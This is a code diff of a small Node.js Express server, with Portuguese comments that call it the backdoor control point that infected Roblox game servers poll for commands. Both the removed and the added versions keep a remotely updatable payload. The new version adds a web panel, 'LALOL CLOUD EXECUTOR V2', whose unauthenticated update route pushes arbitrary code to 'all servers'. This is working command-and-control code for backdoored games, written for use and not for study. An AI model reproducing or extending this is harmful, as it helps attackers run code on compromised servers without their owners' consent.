@@ -1,32 +1,30 @@
 const express = require('express');
 const app = express();
-const port = 3000;
+const PORT = process.env.PORT || 3000;
 
-// Este objeto representa o comando atual que todos os servidores infectados vão rodar
-let currentPayload = {
-    command: "print("Load🎉🎉")",
-    version: 1
-};
+let payload = { command: "print('Load🎉🎉🎉🎉')", version: 1 };
 
-app.use(express.json());
-
-// ROTA PARA O BACKDOOR: O Roblox vai ler isso aqui
-app.get('/api/v1/control', (req, res) => {
-    res.json(currentPayload);
+app.get('/', (req, res) => {
+    res.send(`
+        <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
+            <h1>LALOL CLOUD EXECUTOR V2</h1>
+            <form action="/update" method="get">
+                <textarea name="code" style="width:80%;height:200px;background:#111;color:#0f0;border:1px solid #0f0;"></textarea><br><br>
+                <button type="submit" style="background:#0f0;color:#000;border:none;padding:15px;cursor:pointer;font-weight:bold;">EXECUTAR EM TODOS OS SERVIDORES</button>
+            </form>
+            <p>Versao: ${payload.version}</p>
+        </body>
+    `);
 });
 
-// ROTA PARA VOCÊ: Use isso para mudar o comando remotamente via Postman ou Navegador
-app.get('/api/v1/update', (req, res) => {
-    const newCode = req.query.code;
-    if (newCode) {
-        currentPayload.command = newCode;
-        currentPayload.version++;
-        res.send(`Comando atualizado para a versão ${currentPayload.version}`);
-    } else {
-        res.send("Envie um código via ?code=");
+app.get('/api/control', (req, res) => res.json(payload));
+
+app.get('/update', (req, res) => {
+    if (req.query.code) {
+        payload.command = req.query.code;
+        payload.version++;
+        res.send("Enviado! <a href='/'>Voltar</a>");
     }
 });
 
-app.listen(port, () => {
-    console.log(`AureusAPI rodando em http://localhost:${port}`);
-});
+app.listen(PORT, () => console.log('AureusAPI-1 Online'));
